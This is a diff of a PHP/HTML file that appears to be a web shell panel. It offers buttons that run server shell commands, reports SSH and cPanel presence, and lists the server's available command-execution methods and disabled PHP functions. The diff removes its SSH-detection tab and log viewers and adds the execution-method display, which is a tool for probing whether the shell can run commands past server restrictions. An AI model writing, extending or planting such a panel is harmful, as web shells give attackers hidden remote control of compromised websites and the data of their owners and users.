-        <div id="monitor_result" style="display:none;" class="cmd-output"></div>
-    </div>
-    
-    <!-- Tab: SSH -->
-    <div id="tab-ssh" class="tab-content">
-        <h3><i class="fas fa-shield-alt"></i> SSH Detector <span>Config Reader</span></h3>
-        
-        <div style="background:rgba(255,255,255,0.02);border:1px solid rgba(255,255,255,0.04);border-radius:12px;padding:15px;margin:10px 0;">
-            <h4 style="color:rgba(255,255,255,0.5);font-weight:400;font-size:14px;">🔍 Quick Detection</h4>
-            <div class="quick-commands">
-                <button onclick="runSSHDetect()" class="btn btn-cyan"><i class="fas fa-search"></i> Auto Detect</button>
-                <button onclick="runSSHConfig()" class="btn btn-primary"><i class="fas fa-file-alt"></i> Read Config</button>
-                <button onclick="runSSHPort()" class="btn btn-warning"><i class="fas fa-network-wired"></i> Quick Port</button>
-            </div>
-            <div id="ssh_result" style="display:none;" class="cmd-output"></div>
-        </div>
-        
-        <?php if (!empty($ssh_output)): ?>
-            <div class="cmd-output"><?php echo nl2br(htmlspecialchars($ssh_output)); ?></div>
-        <?php endif; ?>
-        
-        <div style="margin-top:15px;">
-            <h4 style="color:rgba(255,255,255,0.4);font-weight:400;font-size:13px;">📋 Manual Commands</h4>
-            <div class="quick-commands">
-                <button onclick="setCmdAndRun('ps aux | grep [s]shd')">🔍 Process</button>
-                <button onclick="setCmdAndRun('netstat -tulpn | grep sshd')">📡 Port</button>
-                <button onclick="setCmdAndRun('ss -tulpn | grep sshd')">📡 SS</button>
-                <button onclick="setCmdAndRun('systemctl status sshd')">⚙️ Status</button><button onclick="setCmdAndRun('ssh -V')">📦 Version</button>
-            </div>
         </div>
     </div>
     
@@ -2976,12 +2381,17 @@ $timestamp_options = getTimestampOptions();
             <div class="item"><strong>PHP Version:</strong> <span class="value"><?php echo phpversion(); ?></span></div>
             <div class="item"><strong>Current Dir:</strong> <span class="value"><?php echo $current_path; ?></span></div>
             <div class="item"><strong>User:</strong> <span class="value"><?php echo function_exists('get_current_user') ? get_current_user() : '?'; ?></span></div>
-            <div class="item"><strong>Server:</strong> <span class="value"><?php echo $_SERVER['HTTP_HOST']; ?></span></div>
-            <div class="item"><strong>IP:</strong> <span class="value"><?php echo $_SERVER['REMOTE_ADDR']; ?></span></div>
-            <div class="item"><strong>ZipArchive:</strong> <span class="value"><?php echo class_exists('ZipArchive') ? '✅ Yes' : '❌ No'; ?></span></div>
-            <div class="item"><strong>cURL:</strong> <span class="value"><?php echo function_exists('curl_init') ? '✅ Yes' : '❌ No'; ?></span></div>
-            <div class="item"><strong>cPanel:</strong> <span class="value"><?php echo file_exists('/usr/local/cpanel/bin/uapi') ? '✅ Yes' : '❌ No'; ?></span></div>
-            <div class="item"><strong>SSH:</strong> <span class="value"><?php echo !empty(kjEx("ps aux | grep [s]shd")) ? '✅ Running' : '❌ Not running'; ?></span></div>
+            <div class="item"><strong>Server:</strong> <span class="value"><?php echo $_SERVER['HTTP_HOST'] ?? 'localhost'; ?></span></div>
+            <div class="item"><strong>IP:</strong> <span class="value"><?php echo $_SERVER['REMOTE_ADDR'] ?? 'unknown'; ?></span></div>
+            <div class="item"><strong>Command Execution:</strong> <span class="value" style="color:<?php echo $env_info['command_works'] ? '#66bb6a' : '#ffa726'; ?>;">
+                <?php echo $env_info['command_works'] ? '✅ Available' : '⚠️ Not Available'; ?>
+            </span></div>
+            <div class="item"><strong>Available Methods:</strong> <span class="value" style="font-size:11px;">
+                <?php echo !empty($env_info['available_methods']) ? implode(', ', $env_info['available_methods']) : 'None'; ?>
+            </span></div>
+            <div class="item"><strong>Disabled Functions:</strong> <span class="value" style="font-size:11px;color:#ffa726;">
+                <?php echo htmlspecialchars($env_info['disabled_functions'] ?: 'none'); ?>
+            </span></div>
         </div>
     </div>
     
@@ -3325,98 +2735,10 @@ function runUnzipAndClear(form) {
     return false;
 }
 
-// ===== LOG =====
-function viewLog(domain_path) {
-    var path = domain_path || document.getElementById('log_domain_path').value;
-    var lines = document.getElementById('log_lines').value;
-    var filter = document.getElementById('log_filter').value;
-    
-    if (!path) { alert('Please enter domain path!'); return; }
-    
-    var resultDiv = document.getElementById('log_result');
-    resultDiv.style.display = 'block';
-    resultDiv.innerHTML = '⏳ Loading log...\n\n';
-    
-    var url = '?ajax=log_view&path=' + encodeURIComponent(path) + '&lines=' + lines;
-    if (filter) url += '&filter=' + encodeURIComponent(filter);
-    
-    fetch(url)
-        .then(response => response.text())
-        .then(data => { resultDiv.innerHTML = data; })
-        .catch(error => { resultDiv.innerHTML = '❌ Error: ' + error; });
-}
-
-function viewAggregatedLog() {
-    var resultDiv = document.getElementById('log_result');
-    resultDiv.style.display = 'block';
-    resultDiv.innerHTML = '⏳ Loading aggregated logs...\n\n';
-    var lines = document.getElementById('log_lines').value;
-    
-    fetch('?ajax=log_aggregate&lines=' + lines)
-        .then(response => response.text())
-        .then(data => { resultDiv.innerHTML = data; })
-        .catch(error => { resultDiv.innerHTML = '❌ Error: ' + error; });
-}
-
-function monitorChanges() {
-    var resultDiv = document.getElementById('monitor_result');
-    resultDiv.style.display = 'block';
-    resultDiv.innerHTML = '⏳ Scanning for changes...\n\n';
-    var minutes = 10;
-    
-    fetch('?ajax=log_monitor&minutes=' + minutes)
-        .then(response => response.text())
-        .then(data => { resultDiv.innerHTML = data; })
-        .catch(error => { resultDiv.innerHTML = '❌ Error: ' + error; });
-}
-
-function monitorDomain(domain_path) {
-    document.getElementById('log_domain_path').value = domain_path;
-    viewLog(domain_path);
-}
-
-// ===== SSH =====
-function runSSHDetect() {
-    var resultDiv = document.getElementById('ssh_result');
-    resultDiv.style.display = 'block';
-    resultDiv.innerHTML = '⏳ Scanning for SSH...\n\n';
-    
-    fetch('?ajax=ssh_detect')
-        .then(response => response.text())
-        .then(data => { resultDiv.innerHTML = data; })
-        .catch(error => { resultDiv.innerHTML = '❌ Error: ' + error; });
-}
-
-function runSSHConfig() {
-    var resultDiv = document.getElementById('ssh_result');
-    resultDiv.style.display = 'block';
-    resultDiv.innerHTML = '⏳ Reading SSH config...\n\n';
-    
-    fetch('?ajax=ssh_config')
-        .then(response => response.text())
-        .then(data => { resultDiv.innerHTML = data; })
-        .catch(error => { resultDiv.innerHTML = '❌ Error: ' + error; });
-}
-
-function runSSHPort() {
-    var resultDiv = document.getElementById('ssh_result');
-    resultDiv.style.display = 'block';
-    resultDiv.innerHTML = '⏳ Checking SSH port...\n\n';
-    
-    fetch('?ajax=ssh_port')
-        .then(response => response.text())
-        .then(data => { resultDiv.innerHTML = data; })
-        .catch(error => { resultDiv.innerHTML = '❌ Error: ' + error; });
-}
-
 document.addEventListener('DOMContentLoaded', function() {
     var currentPath = '<?php echo addslashes($current_path); ?>';
-    document.getElementById('log_domain_path').value = currentPath;
 });
 </script>
 
 </body>
 </html>
-<?php
-// ===== END OF FILE =====
-?>
